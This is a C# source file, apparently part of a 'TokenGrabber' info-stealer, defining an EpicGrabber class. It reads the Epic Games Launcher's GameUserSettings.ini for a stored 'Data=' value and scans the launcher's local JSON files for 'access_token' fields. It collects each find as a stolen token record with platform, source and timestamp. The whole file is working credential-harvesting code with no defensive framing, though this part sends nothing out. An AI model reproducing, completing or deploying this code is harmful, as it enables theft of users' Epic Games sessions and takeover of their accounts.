namespace TokenGrabber.Grabbers;

using System.Text.Json;
using TokenGrabber.Models;

internal sealed class EpicGrabber : ITokenGrabber
{
    private static readonly string EpicConfigPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini");

    private static readonly string EpicStorePath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "EpicGamesLauncher", "Saved", "Data");

    public List<GrabbedToken> Extract()
    {
        var tokens = new List<GrabbedToken>();

        if (File.Exists(EpicConfigPath))
        {
            var content = File.ReadAllText(EpicConfigPath);
            var dataLine = content.Split('\n')
                .FirstOrDefault(l => l.Contains("Data=", StringComparison.OrdinalIgnoreCase));

            if (dataLine != null)
            {
                var value = dataLine.Split('=', 2).LastOrDefault()?.Trim() ?? "";
                if (!string.IsNullOrEmpty(value))
                {
                    tokens.Add(new GrabbedToken
                    {
                        Token = value,
                        Platform = "EpicGames",
                        Source = "GameUserSettings.ini",
                        ExtractedAt = DateTime.UtcNow
                    });
                }
            }
        }

        if (Directory.Exists(EpicStorePath))
        {
            var jsonFiles = Directory.GetFiles(EpicStorePath, "*.json");
            foreach (var file in jsonFiles)
            {
                try
                {
                    var json = File.ReadAllText(file);
                    var doc = JsonDocument.Parse(json);
                    if (doc.RootElement.TryGetProperty("access_token", out var tokenProp))
                    {
                        tokens.Add(new GrabbedToken
                        {
                            Token = tokenProp.GetString() ?? "",
                            Platform = "EpicGames",
                            Source = Path.GetFileName(file),
                            ExtractedAt = DateTime.UtcNow
                        });
                    }
                }
                catch (JsonException) { }
            }
        }

        return tokens;
    }
}
